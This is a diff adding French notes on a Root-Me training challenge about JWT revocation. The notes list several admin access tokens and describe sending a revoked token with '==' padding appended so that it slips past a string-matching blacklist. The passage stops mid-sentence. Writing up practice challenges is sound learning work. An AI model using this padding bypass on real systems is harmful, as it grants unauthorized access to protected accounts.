@@ -88,3 +88,44 @@ if __name__ == '__main__':
 
 
 ```
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzM2MDk1ODksIm5iZiI6MTY3MzYwOTU4OSwianRpIjoiNGJlY2ZkZGEtM2IzYy00MGY0LTkyYjAtMjM4YTM5N2ZjYWMwIiwiZXhwIjoxNjczNjA5NzY5LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.rai2Ia7UpTutOZILaeSSw0I5HBKTTwtjVU5-Gmq3tmA
+
+HEADER
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
+
+
+PAYLOAD
+
+eyJpYXQiOjE2NzM2MDk1ODksIm5iZiI6MTY3MzYwOTU4OSwianRpIjoiNGJlY2ZkZGEtM2IzYy00MGY0LTkyYjAtMjM4YTM5N2ZjYWMwIiwiZXhwIjoxNjczNjA5NzY5LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.
+
+SIGN
+
+rai2Ia7UpTutOZILaeSSw0I5HBKTTwtjVU5-Gmq3tmA
+
+
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzM2MDk1ODksIm5iZiI6MTY3MzYwOTU4OSwianRpIjoiNGJlY2ZkZGEtM2IzYy00MGY0LTkyYjAtMjM4YTM5N2ZjYWMwIiwiZXhwIjoxNjczNjA5NzY5LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.rai2Ia7UpTutOZILaeSSw0I5HBKTTwtjVU5-Gmq3tmA=
+
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzM2MTAzMjcsIm5iZiI6MTY3MzYxMDMyNywianRpIjoiNmQ1YWVlYTUtMmQ2MS00NjRhLWFjM2EtNGQ1ODNjYzc0ZTc1IiwiZXhwIjoxNjczNjEwNTA3LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.89LGjwamLGa72QnX4ZYeOen6AfHxVK2nt8Ums_VgmHc==
+
+
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzM2MTEzNTgsIm5iZiI6MTY3MzYxMTM1OCwianRpIjoiNmQwODBkMjktNmJiYS00ZTczLTk2ZjAtMjdjM2IzOGI0OTE2IiwiZXhwIjoxNjczNjExNTM4LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.n0pfl3KHjpiN3i-VWJHYl6gyl69DBrLvSyUyYJppxdM
+
+Dans cet exercice, on fait une première requête sur l'url
+
+en POST http://challenge01.root-me.org/web-serveur/ch63/login
+en HEADER Content-Type : application/json
+en body : 
+{
+    "username" : "admin",
+    "password" : "admin"
+}
+
+On en récupère un token JWT
+On l'envoie en GET Sur http://challenge01.root-me.org/web-serveur/ch63/admin
+en Authorization : Bearer + MON TOKEN + "==" (mon caractère de bourrage)
+Alors pourquoi ça passe ?? 
+Le token via le script python du code source, va être enregistrer en base en tant que Token révoqué, une strict 
